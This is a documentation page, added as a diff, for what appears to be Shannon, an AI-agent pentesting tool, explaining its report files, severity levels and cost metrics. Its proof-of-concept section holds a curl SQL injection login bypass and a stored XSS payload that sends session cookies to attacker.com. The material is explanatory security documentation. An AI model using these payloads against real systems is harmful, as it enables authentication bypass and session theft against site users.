@@ -1,0 +1,248 @@
+---
+title: Interpreting Reports
+description: Understand Shannon's security assessment reports and deliverables
+---
+
+Shannon generates comprehensive security reports with proven, exploitable vulnerabilities. This guide helps you understand the output structure and how to interpret the findings.
+
+## Output Directory Structure
+
+All results are saved to `./audit-logs/{hostname}_{sessionId}/` by default (customize with the `OUTPUT` parameter):
+
+```
+audit-logs/example-com_shannon-1771007534808/
+├── session.json          # Session metrics and metadata
+├── agents/               # Per-agent execution logs
+│   ├── pre-recon.log
+│   ├── recon.log
+│   ├── vuln-injection.log
+│   ├── exploit-injection.log
+│   └── ...
+├── prompts/              # Prompt snapshots for reproducibility
+│   ├── pre-recon-prompt.txt
+│   ├── recon-prompt.txt
+│   └── ...
+└── deliverables/
+    └── comprehensive_security_assessment_report.md
+```
+
+### Key Files
+
+<AccordionGroup>
+  <Accordion title="comprehensive_security_assessment_report.md">
+    The **primary deliverable** — a pentester-grade security report containing:
+    
+    - **Executive Summary**: High-level overview of findings and risk assessment
+    - **Vulnerability Details**: Each finding includes:
+      - Severity rating (Critical, High, Medium, Low)
+      - OWASP category classification
+      - Technical description of the vulnerability
+      - **Proof-of-Concept**: Copy-and-paste exploits to reproduce the issue
+      - Impact analysis
+      - Remediation guidance
+    - **Attack Surface Analysis**: Insights from reconnaissance phase
+    - **Testing Methodology**: Overview of techniques used
+    
+    This report focuses exclusively on **proven, exploitable vulnerabilities**. Shannon's "No Exploit, No Report" policy means only successfully validated findings are included.
+  </Accordion>
+  
+  <Accordion title="session.json">
+    Contains session metadata and metrics:
+    
+    ```json
+    {
+      "sessionId": "shannon-1771007534808",
+      "targetUrl": "https://example.com",
+      "repository": "example-app",
+      "startTime": "2026-03-05T10:30:00Z",
+      "endTime": "2026-03-05T12:15:00Z",
+      "duration": "1h 45m",
+      "totalCost": "$48.32",
+      "agents": [
+        {
+          "name": "pre-recon",
+          "status": "completed",
+          "duration": "12m 34s",
+          "cost": "$4.21"
+        },
+        // ... more agents
+      ]
+    }
+    ```
+    
+    Use this to track costs, time per phase, and identify performance bottlenecks.
+  </Accordion>
+  
+  <Accordion title="agents/ Directory">
+    Contains detailed logs for each agent's execution:
+    
+    - Real-time output from the AI agents
+    - Tool invocations (browser automation, command execution)
+    - Decision-making process and reasoning
+    - Error messages and retry attempts
+    
+    Useful for:
+    - Understanding why certain vulnerabilities were flagged
+    - Debugging failed or incomplete runs
+    - Auditing the testing methodology
+  </Accordion>
+  
+  <Accordion title="prompts/ Directory">
+    Snapshots of the exact prompts sent to each agent, including:
+    
+    - Base prompt template
+    - Injected context (config, reconnaissance data)
+    - Variable substitutions
+    
+    This ensures **complete reproducibility** — you can see exactly what instructions each agent received.
+  </Accordion>
+</AccordionGroup>
+
+## Understanding Vulnerability Severity
+
+Shannon classifies findings by severity based on exploitability and impact:
+
+| Severity | Description | Example |
+|----------|-------------|----------|
+| **Critical** | Complete system compromise or data breach | Authentication bypass, SQL injection with full database access |
+| **High** | Significant security impact with straightforward exploitation | IDOR allowing access to sensitive user data, SSRF to internal services |
+| **Medium** | Limited impact or requires additional conditions to exploit | Reflected XSS on non-sensitive pages, authentication flaws with mitigating factors |
+| **Low** | Minimal direct impact but indicates security weaknesses | Information disclosure, weak configurations |
+
+<Note>
+Shannon Lite focuses on **exploitable vulnerabilities only**. It will not report on theoretical issues, vulnerable dependencies, or misconfigurations that couldn't be actively exploited during testing.
+</Note>
+
+## Reading Proof-of-Concepts
+
+Every vulnerability in the report includes a **copy-and-paste Proof-of-Concept (PoC)** demonstrating the exploit:
+
+### Example: SQL Injection PoC
+
+```bash
+# Exploit: Authentication Bypass via SQL Injection
+# Endpoint: POST /api/login
+
+curl -X POST https://example.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "admin\"-- ",
+    "password": "anything"
+  }'
+
+# Response: {"token": "eyJhbGc...", "user": {"id": 1, "role": "admin"}}
+# Status: Successfully authenticated as admin without valid password
+```
+
+### Example: Browser-Based XSS PoC
+
+```javascript
+// Exploit: Stored XSS in User Profile
+// Location: /profile/edit
+
+// 1. Navigate to profile editor
+// 2. Set bio field to:
+<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
+
+// 3. When any user views the profile, their session cookie is exfiltrated
+```
+
+PoCs include:
+- Exact HTTP requests or browser actions
+- Expected responses
+- Confirmation of successful exploitation
+- Impact demonstration
+
+## Interpreting Session Metrics
+
+The `session.json` file provides insights into the pentest run:
+
+### Cost Analysis
+
+```json
+"totalCost": "$48.32",
+"costBreakdown": {
+  "reconnaissance": "$8.45",
+  "analysis": "$22.10",
+  "exploitation": "$15.23",
+  "reporting": "$2.54"
+}
+```
+
+Most cost comes from the analysis and exploitation phases, which run in parallel. See the [Cost Optimization guide](/guides/cost-optimization) for strategies to reduce costs.
+
+### Time Analysis
+
+```json
+"duration": "1h 45m",
+"phaseBreakdown": {
+  "pre-recon": "12m",
+  "recon": "18m",
+  "analysis": "35m",      # 5 agents in parallel
+  "exploitation": "32m",  # 5 agents in parallel
+  "reporting": "8m"
+}
+```
+
+A typical full run takes **1 to 1.5 hours**. The parallel phases (analysis and exploitation) dominate the timeline.
+
+## What Shannon Does NOT Report
+
+Due to its "proof-by-exploitation" methodology, Shannon Lite will **not** report:
+
+- **Vulnerable dependencies**: Outdated libraries that weren't actively exploited
+- **Theoretical vulnerabilities**: Issues that couldn't be proven through exploitation
+- **Configuration weaknesses**: Insecure settings that didn't lead to exploitable flaws
+- **Code quality issues**: Non-security related bugs or anti-patterns
+- **Compliance gaps**: Regulatory requirements not related to exploitable vulnerabilities
+
+<Tip>
+For comprehensive static analysis including dependency scanning and graph-based data flow analysis, consider [Shannon Pro](https://keygraph.io).
+</Tip>
+
+## Common Report Patterns
+
+### High-Confidence Findings
+
+When Shannon reports a vulnerability, it includes:
+
+1. **Source code reference**: Exact file and line number of the vulnerable code
+2. **Exploitation proof**: Successful execution of the attack
+3. **Impact demonstration**: Evidence of what was compromised
+4. **Remediation guidance**: Specific code changes to fix the issue
+
+### No False Positives
+
+If an attack hypothesis couldn't be exploited, it's discarded. The report only includes vulnerabilities that Shannon **successfully exploited**.
+
+### Defense Validation
+
+Shannon will explicitly note when defenses are working correctly:
+
+> "The application implements proper XSS defenses with context-aware output encoding. All attempted XSS payloads were successfully sanitized. No exploitable XSS vulnerabilities were found."
+
+This confirms that certain attack vectors are properly secured.
+
+## Validating Findings
+
+While Shannon's methodology minimizes false positives, **human validation is essential**:
+
+1. **Review the PoC**: Execute the provided exploit in a safe environment
+2. **Check the source code**: Examine the referenced files and line numbers
+3. **Assess impact**: Verify the claimed impact matches your threat model
+4. **Consider context**: Some findings may be acceptable risk based on your security posture
+
+<Warning>
+Always validate findings in a **non-production environment** before attempting to fix them in production. Some remediation strategies may have unintended side effects.
+</Warning>
+
+## Next Steps
+
+After reviewing your report:
+
+1. **Prioritize remediation** based on severity and business impact
+2. **Track fixes** by re-running Shannon against the same workspace after code changes
+3. **Integrate into CI/CD** for continuous security validation (Shannon Pro feature)
+4. **Review agent logs** if you need deeper context on any finding
+
+For questions about specific findings, consult the agent logs in the `agents/` directory or join our [Discord community](https://discord.gg/KAqzSHHpRt).
